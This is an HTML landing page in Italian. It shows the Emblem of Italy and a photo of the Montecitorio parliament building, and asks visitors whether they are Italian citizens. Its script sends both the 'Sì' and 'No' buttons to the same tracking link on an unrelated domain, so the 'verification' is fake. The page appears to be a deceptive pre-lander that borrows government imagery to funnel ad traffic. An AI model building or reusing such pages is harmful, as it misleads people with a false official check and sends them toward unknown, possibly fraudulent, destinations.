<!doctype html>
<html lang="it">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifica</title>
<meta name="robots" content="noindex,nofollow">

<style>
:root{
  --ink:#0b1220;
  --border:rgba(16,24,40,.14);
  --shadow:0 20px 60px rgba(16,24,40,.25);
  --radius:16px;
  --btnRadius:10px;
  --primary:#1d4ed8;
  --primaryHover:#1e40af;
  --focus:rgba(29,78,216,.30);
}

*{box-sizing:border-box}
html,body{height:100%}

body{
  margin:0;
  font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
  display:grid;
  place-items:center;
  padding:24px;

  background:
    linear-gradient(180deg, rgba(11,18,32,.65) 0%, rgba(11,18,32,.78) 100%),
    url("https://upload.wikimedia.org/wikipedia/commons/4/4a/Palazzo_Montecitorio_-_esterno.jpg");
  background-size:cover;
  background-position:center;
}

.card{
  width:min(560px,92vw);
  background:rgba(255,255,255,.95);
  border:1px solid var(--border);
  border-radius:var(--radius);
  box-shadow:var(--shadow);
  backdrop-filter:blur(6px);
  padding:32px 24px;
  text-align:center;
}

.emblem{
  width:64px;
  margin:0 auto 18px auto;
  opacity:.9;
}

h1{
  margin:0;
  font-size:clamp(18px,3vw,26px);
  font-weight:700;
  letter-spacing:-0.01em;
}

.btns{
  margin-top:20px;
  display:flex;
  justify-content:center;
  gap:14px;
  flex-wrap:wrap;
}

.btn{
  appearance:none;
  border:1px solid rgba(16,24,40,.18);
  background:#fff;
  color:var(--ink);
  border-radius:var(--btnRadius);
  padding:12px 18px;
  min-width:160px;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
  transition:.15s ease;
}

.btn:hover{
  border-color:rgba(16,24,40,.28);
  box-shadow:0 10px 20px rgba(16,24,40,.12);
  transform:translateY(-1px);
}

.btn:focus-visible{
  outline:3px solid var(--focus);
  outline-offset:2px;
}

.btn.primary{
  background:var(--primary);
  color:#fff;
  border-color:rgba(29,78,216,.40);
}

.btn.primary:hover{
  background:var(--primaryHover);
}

@media (max-width:420px){
  .btn{min-width:240px}
}
</style>
</head>

<body>

<main class="card">
  
  <!-- Герб Италии -->
  <img class="emblem"
       src="https://upload.wikimedia.org/wikipedia/commons/0/00/Emblem_of_Italy.svg"
       alt="">

  <h1>Sei cittadino italiano?</h1>

  <div class="btns">
    <button class="btn primary" id="yes">Sì</button>
    <button class="btn" id="no">No</button>
  </div>

</main>

<script>
const TARGET_URL = "https://rideon4health.com/6sP8kpy7?fbclid={fbclid}&utm_campaign=ursulabarrett198&utm_source={{site_source_name}}&userId=907&boxId=1388";

function go(){
  window.location.href = TARGET_URL;
}

document.getElementById("yes").addEventListener("click", go);
document.getElementById("no").addEventListener("click", go);
</script>

</body>
</html>
